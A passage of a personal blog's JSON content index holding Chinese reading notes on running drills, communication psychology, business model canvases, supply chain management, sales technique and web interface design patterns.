xcerpt":"","text":"关键跑步姿势 练习1：双脚弹簧 动作：双脚跖球部站立，做轻轻弹跳的动作 目标：利用肌肉的伸缩力像弹簧似的上下弹动 注意：不是肌肉用力做跳动 体会：肌肉的小幅度的伸，然后放松的缩，然后反复循环； 练习2：单脚弹簧 动作：单脚跖球部站立，单腿做轻轻弹跳的动作 目标：利用肌肉的伸缩力像弹簧似的上下弹动 注意：不是肌肉用力做跳动 体会：肌肉的小幅度的伸，然后放松的缩，然后反复循环； 利用重力移动 练习1：侧向移动 动作：双脚持续交叉步侧向移动 目标：让策略带着向右移动，同时要迅速做两脚支撑点转换的动作 注意： 限制脚触地的面积，仅限跖球部； 限制脚触地的时间，提高步频； 不必蹬地，肌肉不必额外使力； 体会：身体需要向移动倾斜，以便可以利用重力带动身体移动 练习2：同伴顶胸 动作： 单脚站立，身体前倾，让同伴用手掌稍稍撑住自己的部分体重； 对方突然抽开双手 让身体自然向前移动 注意力集中于快速抬起支撑脚 重复练习； 目标：体会身体受到重力向前进的感觉 注意：将注意力从落地脚移开，不管它，让其自然下落，而非发力制动，并将注意力转到快速抬起支撑脚上面； 体会： 练习3：同伴搭背 动作： 让伙伴站在后方，用手指放在自己的后背上 试着跑10-15步 目标：通过伙伴的手，让自己专注在姿势上；正常会下意识想摆脱伙伴的手，从而会自动姿势让自己再往前倾与向前落下； 注意： 体会：","categories":[{"name":"社科","slug":"社科","permalink":"http://example.com/categories/%E7%A4%BE%E7%A7%91/"}],"tags":[{"name":"运动","slug":"运动","permalink":"http://example.com/tags/%E8%BF%90%E5%8A%A8/"}]},{"title":"只需倾听","slug":"只需倾听","date":"2016-07-24T08:10:00.000Z","updated":"2024-09-22T23:11:45.599Z","comments":true,"path":"2016/07/24/只需倾听/","permalink":"http://example.com/2016/07/24/%E5%8F%AA%E9%9C%80%E5%80%BE%E5%90%AC/","excerpt":"","text":"基础知识 进化的三个阶段：爬虫动物、哺乳动物、灵长动物； 三个重要的器官：杏仁核、额叶、镜像神经元； 9条沟通法则 控制自己的情绪：包括害怕、愤怒、悲伤等 体察自己的情绪出现了变化； 在心里描述自己的情绪； 思考如何应对； 肯定自己的行动方案，鼓励自己； 开始行动； 清空成见 大脑出于本能和过往经验会形成初步判断，但这个判断不是结论，要时刻提醒自己需要下一步的交叉验证，而不是想当然或者先入为主； 让对方感受到我们的理解 体察情绪 告知体察并印证 修正体察（如有） 加深了解，包括程度和原因两个方面； 讨论行动方案 对别人感兴趣，而不是证明自己有趣 职场交谈的好问题 如何入行？ 这一行最喜欢的地方是什么？ 在职业生涯里，想要实现什么目标？ 为什么这个目标对你很重要？ 如果要实现这个目标，会促使你怎么做？ 个人交往好问题 在你的生活中，对你影响最大的人是谁？ 你最感激的人是这个人吗？如果不是，是谁呢？ 有没有机会感谢那个人？ 想象一下，你觉得人生尽善尽美是什么样子的？ 陌生人的好问题 FTD法则：感觉，想法，行为 问出让对方说出“我感觉…””我认为…“”我做过…“等三种回答的问题； 让别人感到自己有价值 寻求他人的认同感是人的天性； 让人们觉得自己有价值，与让其感到被理解和感到自己是个有趣的人不一样，因为这个做法在更深的层次上面触动了他们； 帮助他人抒发郁结 向讨论糟糕感受本身的方向去问问题； 让对方有充裕的时间表达； 不管对方说什么，不争论，不辩护； 等对方发泄完了，再简单多说一句：“再多跟我说说。” 其他可以问的问题：”我有没有让你觉得，我不够尊重你？，或者”我有没有让你觉得，你说的话不值得一听？ 消除错位现象 定位问题，针对未来提供建议； 激情、热忱、自豪三个维度的调研与建议收集； 茫然无助的时候，主动示弱 示弱是一种强大的力量，比示强更能取得强大的效果； 每个人都有自己软弱的一面； 远离有毒的人 贪婪的人：转向离开，毫不犹豫； 恃强凌弱的人：对方以为我们好欺负，要表现出相反的特性，出乎其意料，并知难而退； 做法一：保持眼神接触，举止十分礼貌，但同时显示出感到无聊乏味的样子，放松，显示自己在走神一样； 做法二：进行反击，准备好退路； 爱占小便宜的人：以交换为条件； 自恋的人：可以选择离开，也可以选择留下，如果是后者，做好双方不平等的心理准备； 精神病患者： 特征：冷酷，缺乏同理心，以自我为中心，无情 做法：彻底离开 12个简单沟通秘诀 真的不可能吗 适用场景：当对方拒绝采纳建议进行改进的时候 做法： 借力：先让对方描述一件不可能做到，但做成了有极大好处的事情 卸力：表示理解 推力：询问怎么做可以把它变得可能 魔力悖论 适用场景：当对方拒绝沟通的时候 做法： 考虑如何描述情况，让对方说“是”； 当对方说是的时候，其潜意识里会觉得我们是让在他一边的； 催生同理心 适用场景：当A、B两方陷入沟通的僵局的时候 做法：把原来要问A方对B方的感觉的问题，让B方进行猜想并回答 原理：引导同理心发挥作用 出乎意料的立场转换 适用场景：当某人的表现让我们失望，需要与其交流以督促其改进的时候； 做法 预约专门的沟通时间（以便对方可以专注而不被其他事情打断，影响沟通效果） 讲3件自己可能给对方带来失望或者愤怒的事情，并表示歉意 询问对方自己讲得对不对 询问对方对这些事情的感受 结束对话，表示这些一直在心里，此次对话的目的只是为了把它们说出来，让双方变得更好，没有其他的事情； 你真的这么想吗 用来回应那些小题大做，夸张言辞的情况； 做法： 冷静、默数到5，问出问题，复述对方言辞（如果对方没反应过来的话） 再次确认对方是否真的这么觉得，如果是的话，希望听他好好描述以下情况，以便可以寻找解决方案； 分支 如果对方开始缓和，表示对其情绪（生气、郁闷、失望等）的理解，然后表达自己如何才可以帮得上忙； 如果对方坚定的回答“是”，那么坐下来详细聊一聊，因为可能真的碰到了棘手的大问题； “嗯”的力量 适用场景：将失去情绪控制的局面引导到理性思考的局面 做法 当对方发火的时候，不争辩，不反驳，而是引导对方多说说（借力，卸力） 在引导的过程中，对其情况表示理解，希望尽量帮其解决问题，期待多听对方讲讲发生的情况； 原理：通过这个引导，会让对方感觉自己跟他们是同一个战壕里面的，避免其处于反击状态，而会放下武器，同时也引导他们将情绪发泄出来； 事先自我揭短 适用场景：当人们对要发生的谈话存在疑虑的时候，缘于担忧我们的某个缺点或弱点 做法： 将他们担忧的问题说出来 讲一下应对的方案，或者一些可以证明其不成问题的证据 原理：事先摆出问题，就会让对方提前卸除对这个问题的怀疑和防御，然后专注于其他部分的内容； 从交易到交心 适用场景：开启深入内心深处的聊天，而不是例行公事 做法：问出正确的问题，这些问题包括 对人的期待、看法 对生活的期待、目标、看法 对工作的期待、目标、看法； 对未来的展望、看法 对事物的想法 肩并肩的交流 适用场景：通过非说教的方式引导对方对问题进行思考， 以得出答案；或者为了得到更多的信息； 做法：跟对方一起做一件事情，然后用预先想好的问题进行提问，探索对方在做什么，想什么，有什么感受； 原则：不争论、不说教、不打断； 填空法 适用场景：打破对方的防御状态，让对方放下过戒备，参与到对话里面来 做法：询问问题，但将关键部分放空，邀请对方回答 原理：没有推销什么，而是引导对方自己说出来； 快速应对7种棘手问题 如何搞定糟糕的团队 先团队沟通 肯定大家的价值，放低自己； 提出问题 提出解决方案 讨论愿景 讨论共同价值观 再逐一单独沟通 骨干：为其扫除障碍； 老员工：让其感觉到自己有价值； 抱怨者：让其感觉到自己很重要； 同行者：挑明对方的想法，用宽容和谦卑消解；（重量级感谢） 如何顺利升迁 问两个问题： 你最希望我持续去做的三件事是什么； 你最希望我永远不做的三件事是什么； 问一些能够交心的、加深双方感情的问题；同理心，让对方感觉到你理解他； 把眼光越过上级，往外寻找更成功更受尊敬的人士来做导师，询问：我想学习你懂的一切，最好的方法是什么？ 如何对付自恋狂 将任务的优先级安排交给对方来决策，并用较正式的方式记录下来； 避免陷入由其提要求，却不用为决定负责的境地； 如何拓展人脉 VCP流程：相识、可信、互惠； 相识阶段 对别人感兴趣，而不要证明自己有趣，多谈别人，少谈自己，多问别人是怎么做的，如何做到，什么样的策略有效等； 让人们感觉到你的理解：表露你的关心，理解别人的处境，帮助解决； 问出交心式的问题 重量级感谢 可信阶段 不要制造错位，不要做出无法实现的承诺，坦诚而无误的呈现自己； 让对方觉得自己有价值，尽力去帮助对方； 如果得到帮助，要明确表示感激； 互惠阶段 让新朋友一直觉得他很有趣，觉得他很重要，觉得你能理解他； 放松，让时间来自然培养和加深双方的关系； 如何对付失控的人 第一阶段：从爬虫到哺乳 告诉我出了什么事 复述对方的意思 等待，直到对方说出“是” 用一个准确的词，描述对方的情绪感受，再得到“是”； 第二阶段 马上解决这个重要是如此重要，原因是…（让对方填空） 指出道路，表明要一起去寻找解决办法； 如何与自己对话 六步暂停法 练习对身体的觉知：辨认身体的感觉（五官） 练习对情绪的觉知：给情绪命名 练习对冲动的觉知：“这种情绪让我想…”，觉察自己冲动 练习对后果的觉知：要是我一时冲动做了，会发生什么事？ 练习对解决办法的觉知：更好的做法是…. 练习对好处的觉知：如果我采取了这个更好的做法，好处是… 如何接近大人物 创造一对一的交谈机会 让对方感受到你的理解 让对方感觉有面子，创造镜像神经元的同理心，鼓励他们产生回报你的愿望； 利用网络 在线上与大人物接触 核心原则：人们希望得到别人的理解 做法：在他会去关注的地方，表达自己的理解 接近守门人 表达对守门人的职责和工作的重要性 发现守门人的有趣之处 让守门人感受对其工作的理解 三个基本原则 让人们觉得自己很有趣 让他们觉得自己很重要 让他们感受到你的理解","categories":[{"name":"社科","slug":"社科","permalink":"http://example.com/categories/%E7%A4%BE%E7%A7%91/"}],"tags":[{"name":"心理学","slug":"心理学","permalink":"http://example.com/tags/%E5%BF%83%E7%90%86%E5%AD%A6/"}]},{"title":"商业模式新生代","slug":"商业模式新生代","date":"2016-07-10T07:39:00.000Z","updated":"2024-09-22T23:11:07.479Z","comments":true,"path":"2016/07/10/商业模式新生代/","permalink":"http://example.com/2016/07/10/%E5%95%86%E4%B8%9A%E6%A8%A1%E5%BC%8F%E6%96%B0%E7%94%9F%E4%BB%A3/","excerpt":"","text":"商业模式画布 KP：关键合作, Key partnerships; 部分业务环节外包，由其他重要伙伴供应； 商业模式的优化和规模效应 风险和不确定性的降低 特定资源和业务的获取 KA：关键业务, Key activities; 制造产品 解决问题：新的解决方案，如咨询行业、医院或其他服务机构； 提供平台&#x2F;网络 KR：关键资源, Key resources; 实体资产 金融资产 知识资产 人力资源 CR：客户关系, Customer relationships; 个人助理 专用个人助理 自助服务 自动化服务 社区 共同创作 CS：客户细分, Customer segments； 需要提供明显不同的产品或服务来满足客户群体的需求； 客户群体需要通过不同的分销渠道来接触； 客户群体需要不同类型的关系； 客户群体的盈利能力有本质区别； 客户群体愿意为产品或服务的不同方面付费； CH：渠道通路, Channels， 认知：我们如何在客户中提升对我们公司产品或服务的认知； 传递：我们如何把价值主张传递给客户； 评估：我们如何帮助客户评估我们公司的价值主张； 购买：我们如何协助客户购买特定的产品和服务； 售后：我们如何提供售后支持； VP：价值主张, Value proposition; 新颖 性能 定制化 高品质 设计 品牌&#x2F;身份地位 价格 降低成本 降低风险 可达性 易用性&#x2F;便利性 C$：成本结构, Cost structure; 类型 成本驱动 价值驱动 特点 固定成本 可变成本 规模经济 范围经济 R$：收入来源, Revenue streams; 收费方式： 资产销售：一次性收入，例如销售实体产品； 使用收费：有用有收，没用不收，如打电话； 订阅收费： 一次性收取一定时间内使用，比如订阅报纸、健身年卡； 租赁收费：用多久给多久； 授权收费：知识产权 经纪收费：中介服务 广告收费：广告宣传 定价方式 静态 固定价格的标价 基于产品特性的定价 基于客户细分的定价 基于采购数量的定价 动态 收益管理定价：根据库存和购买时间 实时市场定价：根据供需关系 拍卖定价：根据竞拍结果 商业模式画布 KP：重要伙伴, Key partnerships; 部分业务环节外包，由其他重要伙伴供应； 工厂，报关行、原材料供应商； KA：关键业务, Key activities; 寻源、议价、开发、跟单、出货、清关； KR：核心资源, Key resources; 开发室，团队； CR：客户关系, Customer relationships; 1. CS：客户细分, Customer segments； 大卖场，低端品牌； CH：渠道通路, Channels， 展会； VP：价值主张, Value proposition; 采购服务，以合适的成本按时按质交付； C$：成本结构, Cost structure; 人员薪资，办公租金，研发费用； R$：收入来源, Revenue streams; 业务销售收入，财务投资收入，资金拆借收入；","categories":[{"name":"社科","slug":"社科","permalink":"http://example.com/categories/%E7%A4%BE%E7%A7%91/"}],"tags":[{"name":"商业","slug":"商业","permalink":"http://example.com/tags/%E5%95%86%E4%B8%9A/"}]},{"title":"采购与供应链管理","slug":"采购与供应链管理","date":"2016-05-13T08:43:00.000Z","updated":"2024-09-22T23:09:28.927Z","comments":true,"path":"2016/05/13/采购与供应链管理/","permalink":"http://example.com/2016/05/13/%E9%87%87%E8%B4%AD%E4%B8%8E%E4%BE%9B%E5%BA%94%E9%93%BE%E7%AE%A1%E7%90%86/","excerpt":"","text":"采购、运营、物流；站在不同的角度，对供应链管理会有不同的理解，另外由于完全熟悉这三个领域的人极少，所以很难有一个全局观，大家经常各说各话，盲人摸象；目前从美国三大协会的发展，相信在未来一段时间内，仍然会难以大一统，不过这种百花集放的局面，也没有什么不好，因为供应链管理实在过于复杂，想有一个标准统一的答案，显然也是不现实的，而要根据自己公司所处的行业以及属性，来选择一个适合自身的解决方案，没有速成的特效药或者捷径； 计算现在的供应时间，库存成本，再分析时间都浪费在了哪些环节上面，通过信息透明化、各个部分协同合作，达到整个链条的最优； 我们离集成供应链还有很长的距离要走，要解决两个方面的问题，一个是关系，一个是连接；前者着重于打破公司与公司、部门与部门、人员与人员之间的各自为政，通过有效的绩效措施，让他们密切合作达到全局优化，而不是局部优化；后者是指使用合适的信息化工具，让信息的沟通和数据的同步变得方便起来，而不是像以前一样费时费力，导致大家没有将精力花费在打通关系上面，而是都花在了救火上面； 关于复杂度是供应链管理的大敌，我突然想起小而美的思想，既好的公司应该是专注于自己的细分领域，做到极致，从而形成最佳的竞争力，而不是追求大而全，因为越是大而全，复杂度越是呈几何级数的上升，导致供应链管理的失控； 减肥界的名言，决心比技巧更重要。对于供应链来说，未尝不是如此，工具并不困难，但领导层的决心与行动，却是更加重要； 关于设计不懂生产，导致设计的时候未考虑成本因素，放在软件行业来说，也是如此，所以原型的评审，是很有必要加入开发工程师来一起完成的，这样才有办法在开发之前，找到最优的解决方案； 如何在供应链的设计中，引入跨职能部门的协作？软件行业的敏捷与精益小团队，是一种方式；还有其他方式没? 复杂度的控制 内部：产品标准化（设计）、精益生产（流程）、组织重构（组织）； 外部：需求整合、供应商整合 在时尚行业，需求是很难预测的，所以导致这个行业库存经常居高不下，那么，在未来是否在可能通过大数据提高需求预测的准确性呢？同时辅以快速生产，最终达到降低库存的目的； 我突然有点明白设计软件中那么多的基础材料参数的作用是什么了，如果部料或部件的选用是要求限定在一定范围之内的话，即减少定制化，尽量标准化，则这个部件库的使用就是一种好的解决方案； 对于二级、三级供应商的管理，取决于谁是最合适的人，即谁最有能力去管理，这个人就要勇于承担起责任，这样才能达到最终整条供应链的最优；很多时候，一级供应商并没有这个能力； 看到举例的电子行业的牛鞭效应，我突然觉得这种情况很有可能也发生在国内的很多行业中。越是处于供应链后端的企业，对市场需求的预测越是失真，导致产量的波动越是厉害；当然国内政府对市场的干预，可能也是一部分扩大产能的原因； 不信任造成了信息的不对称，那么应该如何设计一个绩效考核机制，来消除这种不信任？我在想，信任其实是每一件小事积累起来的，而不是凭空产生的，所以如果能够更加实时的互动反馈，例如敏捷里面的最小原型以及快速迭代的办法，或许可以让各方看到共同协商的决策出现的市场结果，之后大家继续修正迭代；一个决策越是共同做出的，大家的执行力就会越强，而缩短这个决策的周期，成本也更低，大家也更容易做出决定，不会因为成本太高而产生犹豫和谨慎； 控制库存的办法，需要先分清当前的库存是哪一种类型的库存，包括周转库存、安全库存、多余库存；对于周转库存，应想办法缩短生产周期，通过推拉结合，减少一些低价值高成本的等待；对于安全库存，考虑通过信息透明和信息共享来降低不确定性，减少牛鞭效应；对于多余库存，则考虑需求管理，让销售与计划更加密切的分享信息和配合，如定期会议制度，以及设置相应的绩效考核机制，让销售减少时间在催料上，而更多精力放在密切了解客户需求上，这样需求预测就会变得更加准确，减少之前没有有效管理需求而产生的不必要的多余库存； 我以前以为单靠市场的力量，优胜劣汰就能够解决供应商管理的问题，但现在反观觉得这个思路可能有点过于简单化了；这好比团队伙伴的组建，通过优胜劣汰频繁更换团队成员，并不能更好的提高产出，反而应该是严格谨慎的筛选，选择最优秀的伙伴，之后大家相互促进配合，才有可能打造一流的团队。如果频繁更换团队成员，时间都浪费在了磨合上面。每一个人的工作方式是不一样的，每一个公司也是如此，每次更换新的公司，都会涉及到流程配合的磨合，这些都是低效产出的代价； 对于供应商而言，可能一开始为了接到某个大客户的订单，而有所牺牲。但如果这个大客户没有一套供应商管理体系，那么这家供应商说不定跳入的是一个坑。以后续配合的过程中，仍然赚不回来应赚到的钱，反而被拖累并搜刮完每一分利润；采购方选择供应商很重要，而供应商选择客户其实也很重要； 关于供应商的寻源，我突然想到谷歌的招聘委员会以及绩效考核委员会，它都是通过专业化、指标化、权力分散化的做法，来让事实更加客观，同时也杜绝腐败或者漏网之鱼；（读到本书的后半部分，发现有个IBM的例子即是如此操作） 我突然觉得轻资产的贸易公司在一定情况下是有其价值的，比如当它拥有技术知识、管理能力、信息系统时，它就可以在一定程度上满足客户的采购外包需求；但这些东西也是高附加值的东西，如果客户足够强大，它是否会觉得有必要自己组建团队呢？不然是否会对这家贸易公司形成了重度的依赖？ 刚看到一句话，订单生产过程中，80-90%的时间都耗在了等待上，现实是否如此？为什么？ 感觉第二大部分主要是讲如何管理供应商，包括供应商的分类、各类别如何区别对待、在过程中根据有效的绩效考核指标，不断发现问题和改进问题，辅导供应商进行流程优化和信息化以降低成本，最后将供应商集成到自己的设计环节； 第三大部分主要站在一个采购职人的角度，来讲一下自己应该做些什么，除了对外管理供应商，还包括对内的需求管理、设计管理等跨职能部门的合作； 集中采购需要根据行业情况进行区分对待，比如大批量行业与小批量行业的适用情况即可能不同，因为侧重点不同，前者如果是成熟部件，则更关心成本；后者如果是定制化的部件，则更关心交货期与质量； 产业集群的一个很大的作用，即是可以降低物流的成本；当然，理论上也可以降低一些信息沟通的成本，因为有什么问题，大家可以现场讨论解决方案； 供应商的价值点包括：价格、质量、货期、服务、技术、人员、资金；所以判断一家供应商是否优质，不能单从价格一个维度去考量； 根据自己的业务是处于上升期，还是平稳期，来决定是否引入更多的供应商，还是充分利用现有供应商的力量，不包是产能还是设计； 当与优质或战略供应商商量长期合作合同时，付出的同时，也要有所得，包括更优惠的成本、各项绩效指标、资源倾斜等，而不是只有付出，没有收获，变成容易忽视的老好人；","categories":[{"name":"社科","slug":"社科","permalink":"http://example.com/categories/%E7%A4%BE%E7%A7%91/"}],"tags":[{"name":"供应链","slug":"供应链","permalink":"http://example.com/tags/%E4%BE%9B%E5%BA%94%E9%93%BE/"}]},{"title":"销售圣经","slug":"销售圣经","date":"2016-04-25T01:09:00.000Z","updated":"2024-09-22T23:11:28.446Z","comments":true,"path":"2016/04/25/销售圣经/","permalink":"http://example.com/2016/04/25/%E9%94%80%E5%94%AE%E5%9C%A3%E7%BB%8F/","excerpt":"","text":"第一个要素“销售” 推销员的四种类型： 零售类推销员：这种类型比较适合使用乔吉拉德的方法，他的方法非常适合于这种类型的销售； 批发类推销员 产品推广类推销员 特种产品推销员：服务类产品，例如物流运输； 第二个要素“人” 你代表着你的老板和公司，但更重要的是，你代表着你自己，你的个人价值和你的尊严； 第三个要素“术” 熟悉和实践销售知识，激发客户的购买欲望； 善于表达自己的想法，通过我们的介绍，让产品在客户的脑海中留下清晰和鲜明的印象，激起客户的购买欲望； 了解向别人传递自己的想法的知识，并在实践中运用这些知识； 提高销售能力的三个阶段： 了解自己所在行业和产品的各种知识； 学习如何有效的向客户传递我们关于产品的想法； 以正确的方法去实践以上学习到的两点知识； 说服目标客户之前，尽量全面了解客户的各种信息； 我们出售的不是商品，而是关于商品的想法（所以首先要确保自己关于商品的想法是正确和完善的） 客户的想法会在纯粹想象和虚拟感觉的刺激下不断得到强化，所以推销员要充分激发客户的各种感觉，包括视觉、听学、味觉、嗅觉、触觉等，另外还有重量感、平衡感； 传达想法的三个途径：语言、语气、动作（重要性从低到高）； 要想成功的销售，就需要将客户的否定或中立态度，变成赞同或肯定的态度； 人的本性会导致人倾向相信自己看到的东西，所以动作传达的信息，优先级高于语言传达的信息；因此，要学会如何有传达信息的过程中，有效的利用动作来辅助自己；（由于动作是由潜意识控制的，所以动作上面也很难撒谎，即使可以也只能维持很短的时间，所以电影中的长镜头表演其一般难度是很大的） 准备阶段一：准备 三个要点： 对自己产品的信息了若指掌； 让自己切合客户的需要； 灵活运用所学的知识； 站在客户的立场来思考问题 哪些信息对我有用； 产品如何才能更好的为我服务； 推销员的真正目标是：切切实实为客户服务； 除了全面了解产品的信息外，还需要将其分门别类，归纳整理，条理清晰； 常被忽略的一些知识点： 产品的历史； 产品的生产者； 竞争对手的产品； 推销员应该具备的外部特征： 恰当的举止； 良好的容貌； 得体的服饰； 正确使用双手； 归纳整理知识的7种方法 红线串珠 物以类聚：客户、知识、管理、收入； 抓住一点，兼及其余 投其所好 比长较短； 寻找差异； 名人名言； 准备阶段二：调查研究 除了解产品外，还需要了解所在区域情况和目标客户的情况； 有效利用所有机会进行调研，尤其是有系统有针对性的调研（漫无目的的调研不会有任何结果）； 调研时，应该关注的是客户的实际需要，不是在争取订单，而是在寻找为客户服务的机会；同时也要评估一下自己满足需要的能力，针对不足的地方进行弥补和改善； 寻找目标客户时，遵循一个标准：即产品能够满足其实际需要； 调研时，应该同时关注最终消费者的利益； 调研也是一项重要的工作，值得投入足够的时间； 调研的顺利进行，以亲和力为基础，使得身边的人乐于回答你的问题； 学会倾听，从倾听中获取知识； 真诚的向对方说出自己希望得到的信息；不要让对方觉得你有什么东西藏着或隐瞒着； 理解别人并和别人产生情感上的共鸣； 准备阶段三：接近客户和拜访客户的计划 提前研究拜访客户的正确方法 拜访前做好充分的准备和应对计划，以便现场出现各种情况时可以从容应对； 接近客户的兴趣，揣摩客户的心思； 站在客户的角度来审视自己，提前想象一下自己给客户的第一印象是什么？（良好的第一印象是好的开端）； 思考：在拜访客户时，如何才能将自己服务至上的宗旨传达给客户？ 多方面的准备，包括客户的不同性格类型、各种可能存在的突发状况； 训练自己的感觉，洞察别人的心理活动； 推荐信：除非充分确认推荐人的意愿，否则不要勉强请求当事人出具； 介绍信：一封以公司高层名义出具的谦恭措词的介绍信； 针对各种可能拒绝的场景，提前想好应对之策； 如果让客户觉得自己是一个值得一见的推销员？让客户认识到自己是来提供真正的服务的，而不是来赚他们钱的；所以推销员需要真真切切的了解到客户的需求，甚至是客户自己未发现的需求； 业界动态：提供信息服务的一种；关于产品的介绍，克制的另外约谈； 在见到客户的下属时，应表现出对其职责的理解和权威的认同，但不谄媚，而是平等尊敬的姿态； 介绍阶段一：评估客户 在向客户介绍产品的时候，一直都需要准确的知道自己的介绍在客户那边产生了什么样的效果；感知客户的语言、语气和动作；注意辨别哪些是客户假装出来的，哪些是客户真实的想法； 重要的是了解到客户通常的思维习惯，而客户当时某个具体的想法则不是特别重要； 不确定自己对错的时候，停下来，先仔细观察和倾听； 观察客户的环境、客户的同事，以及客户本人； 应该首先收集瞬息之间感知到的信息，而不急于对其做出判断；了解足够多的细节后，再对其做出诠释； 训练大脑的三个要点： 瞬间感知大量外在信息的能力； 将外在信息与心理活动相联系的能力； 将发现的客户特征运用到销售流程中的能力； 性格特征：快与慢，动与静，理智与情感，内向与外向，短期与长期，从容与焦虑，自我与社会； 客户的购买动机 商业：个人利益、公司利益、影响力、节省时间； 经济：赚钱、省钱、喜欢消费； 生理：舒服、方便、生理欲望满足； 心理：审美、情感、服务他人； 介绍阶段二：获得关注并激起兴趣 吸引客户注意的三阶段： 推销员本身：穿着打扮及随身物品； 推销的商品； 商品的价值； 吸引注意力的五种办法： 让客户感觉非常突然；（出乎意料的开场白） 频率非常剧烈； 方式十分新颖；（使用非语言类的道具） 节奏富于变化； 印象上没有规则；（这一点是啥意思？） 人有多种感受器官，针对这些器官，设计不同的介绍方案； 客户的注意力倾向性： 运动 图片 声音 平衡与和谐； 通过一些建议或暗示，使客户认识到，如果他们拥有了某件商品，即可以获得个人的利益或者个人的满足； 说服阶段一：劝导客户并引起客户的购买欲望 能够支配一个人的欲望是感情，而不是思想；故以理服人，不如以情动人； 一个人有购买欲望说明他有某种需要，他需要某种东西并且内心里渴望得到这种东西；他认识到自己缺乏某种东西，他希望对这种缺乏加予弥补； 情感需求，马斯洛的需求模型，包括：安全感，情感（人与人的相互关系），自我尊重（对自我的评价）和社会尊重，自我实现（创造力、道德感、自觉性、公正）； 先陈述一种情感上的客观事实，而不提到产品与它们的关系，这样客户无法反驳，也会不容易产生怀疑；这样做的目的是促使客户意识到他所面临的问题或所缺乏的东西；当一个人意识到自己缺乏什么的时候，才能产生关于弥补缺乏的需要，从而产生购买欲望；当出现购买欲望的时候，再引导客户想象其拥有了产品后，所带来的不一样的场景画面；此时应考虑通过语言、语气和动作来强化这种想象； 销售人员要让客户感到自己是切实为他们的利益着想； 说服阶段二：应对客户的异议 有些异议是借口，此时应忽视它；有些是真正的异议，此时要认真对待； 影响客户购买的三种障碍： 没有钱； 客户对产品不了解； 客户对如何使用产品或转售产品有困难； 当客户被激发了购买欲望以后，内心里面可能还有一个理智的声音在反对这个欲望，不管它是来自保守也好，恐惧消极也好，此时客户充满了矛盾的心理，我们要如何站在欲望的一边？一种做法是我们或许应该致力于消除反方的力量，即降低反方的影响力； 情感是我们一切行为的动机，但情感并不是理智的；当理智与情感之间出现冲突的时候，我们总是想调和理智的看法，来说服自己听从情感；那么，我们如何帮忙客户实现这一个过程呢？我们或许应该协助他们换一个角度看待问题，如短期转长期，微观转宏观，个人转集体等等； 客户产生异议的6种原因： 存在疑虑或担心（如何消除：先试用）； 与自己的购买习惯不一致（换个角度看问题：证明价值）； 对某些特点不满意（如何证明）； 对一般条件不满意（如何解释）； 对销售人员看法不好（如何显示自身的真诚：从语气和动作入手）； 其他客户个人的原因； 判断客户异议的时候，同样也要关注他们的动作、语气、语调和语言，因为这些信息会透露出客户内心的想法； 消除客户异议的3种方法： 断然的否定：不过要以柔和却坚定的方式来否认客户陈述的情况（不过最好配合一个台阶给客户下，比如看错或者信息发布错等）； 先认可，再提出自己的观点； 对客户的异议转变成理由； 从客户的角度来审视每一个异议，根据不同的情况找出不同的应对方法；最重要的是向客户证明，他们提出的异议，并不是他们购买商品不可逾越的障碍； 如果客户在流程中提出了一个异议，有一个处理办法是：好问题，我马上将讲到这里。然后继续自己原来的流程，之后再回到客户提出的异议的问题上面； 成交阶段一：促使客户做出决定并签署订单 此阶段应做一件与前面相反的事情，即帮客户做好权衡对比的工作，即列出决定购买的结果，和决定不购买的后果； 在对赞成和反对的意见进行权衡的时候，有意的从数量、重量、色彩上面来做出区分，以便它们在天平上面的重量显得不同（这一切要建立在商品切实能够满足客户需求的基础之上）；","categories":[{"name":"社科","slug":"社科","permalink":"http://example.com/categories/%E7%A4%BE%E7%A7%91/"}],"tags":[{"name":"销售","slug":"销售","permalink":"http://example.com/tags/%E9%94%80%E5%94%AE/"}]},{"title":"Web界面设计","slug":"Web界面设计","date":"2016-04-16T07:03:00.000Z","updated":"2024-09-22T23:08:43.601Z","comments":true,"path":"2016/04/16/Web界面设计/","permalink":"http://example.com/2016/04/16/Web%E7%95%8C%E9%9D%A2%E8%AE%BE%E8%AE%A1/","excerpt":"","text":"前言 可以尝试在业余时间考虑如何改进市面上的一些产品，做为一种练习； 本书的内容补充与更新: http://designingwebinterfaces.com 交互设计模式库: http://www.welie.com 原理一：直截了当（永远在脑袋中思考现在使用的方法是直截了当的吗？有没有更加直接的办法？） 页面编辑：不离开页面直接编辑（行内编辑：可以不脱离上下文） 单字段行内编辑： 易发现性；悬停邀请；编辑按钮始终可见（如果易读性更重要，则使用悬停）； 易访问性：针对残疾人士，提供备用方案； 多字段行内编辑 如果改动一个字段后，必然涉及改动其他字段，则采用本模式更优，因为这样可以降低用户漏编辑的可能性； 可能占用更多空间，尽量保持显示与编辑两种状态的大小相同，这样可以减少页面抖动； 保持“显示”与“编辑”模式之间的变换平滑而连续； 覆盖层编辑：轻量级悬浮层 当上下文不重要，且编辑区域需要占据较大的空间时考虑使用； 本模式也可以降低意外修改的可能性； 不要针对多个字段创建多个覆盖层；考虑使用一个覆盖层编辑一系列元素（例如JIRA的编辑操作）； 空间允许的情况下，通过“保存”与“取消”按钮来完成或撤销编辑（按钮更具有仪式感，给用户带来更多的确定性）； 如果可能，允许用户拖动覆盖层，以便看到被覆盖层遮住的内容； 表格编辑 易读性优于易发现性； 通过单击启动编辑，避免使用悬停，不然一移动鼠标就会带来阅读干扰（捕鼠器）； 相对显示状态，编辑状态占据更大的空间，以示与“显示”状态的区别； 群组编辑 用一个开关控制开启和关闭编辑状态；易读性与易发现性之间的一种平衡； 模块配置 允许用户直接配置模式（例如控制模块内显示的内容条数）； 当配置是一个主要功能时使用； 如果显示内容（易读性）很重要，考虑以全局的方式开启&#x2F;关闭模块配置； 利用拖放 拖放模块 如果需要清晰显示预览效果，则使用占位符； 如果需要尽量避免页面抖动，则使用插入条； 使用被覆盖模块的中心点来确定放置位置； 半透明被拖动对象； 如果使用缩略图来表示被拖动的模块，则使用插入条； 拖放列表 如果可能，尽量使用占位符实时显示拖动效果； 使用鼠标来定位拖动的位置；（如果能实时显示拖动后的预览效果，本点我个人倒是觉得不太重要；当然，如果偏移太厉害，会给用户带来排版不准确的坏印象） 如果响应速度很重要，则考虑使用插入条，因为插入条涉及的计算量比较小； 由于拖动的易发现性不好，所以应提供备用替代方案； 在用户使用替代方案时，考虑如何置入提示，让用户知道有拖放功能； 拖动比较适合在一屏内的有限区域范围内使用，如果是多页长列表，则应考虑辅助方案，如按字母顺序定位，比例滚动条标尺定位，全景缩略+放大镜定位等； 拖放对象 如果对象间的关系可以形象化，则使用拖动来配置关系，是非常有效的方案； 